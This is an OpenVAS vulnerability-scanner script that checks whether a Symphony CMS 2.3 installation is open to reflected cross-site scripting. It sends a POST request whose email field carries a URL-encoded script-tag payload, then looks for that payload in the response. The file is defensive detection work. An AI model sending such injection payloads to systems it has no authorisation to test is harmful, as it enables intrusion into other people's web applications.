###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symphony_56094.nasl 12 2013-10-27 11:15:33Z jan $
#
# Symphony Multiple Remote Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Symphony is prone to following multiple remote security
vulnerabilities:

1. An authentication-bypass vulnerability
2. Multiple cross-site-scripting vulnerabilities
3. An HTML-injection vulnerability
4. Multiple SQL-injection vulnerabilities

An attacker may leverage these issues to run malicious HTML and script
codes in the context of the affected browser, steal cookie-based
authentication credentials, to gain unauthorized access to the
affected application, access or modify data, or exploit latent
vulnerabilities in the underlying database.

Symphony 2.3 is vulnerable; other versions may also be affected.";

tag_solution = "Reportedly, the issue is fixed. However, Symantec has not confirmed
this. Please contact the vendor for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103604";
CPE = "cpe:/a:symphony-cms:symphony_cms";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(56094);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 12 $");

 script_name("Symphony Multiple Remote Security Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56094");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-11-06 13:03:17 +0100 (Tue, 06 Nov 2012)");
 script_description(desc);
 script_summary("Determine if Symphony is prone to XSS");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_symphony_cms_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("symphony/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID))exit(0);
host = get_host_name();   

req = string("POST ",dir,"/login/retrieve-password/ HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
             "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
             "DNT: 1\r\n",
             "Connection: keep-alive\r\n",
             "Referer: http://",host, dir,"/login/retrieve-password/\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 101\r\n",
             "\r\n",
             "email=%22%3E%3Cscript%3Ealert%28%27openvas-xss-test%27%29%3C%2Fscript%3E&action%5Breset%5D=Send+Email\r\n");

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(result !~ "HTTP/1.. 200")exit(0);

if("<script>alert('openvas-xss-test')</script>" >< result && "Send Email" >< result) {

  security_hole(port:port);
  exit(0);
}  

exit(0);
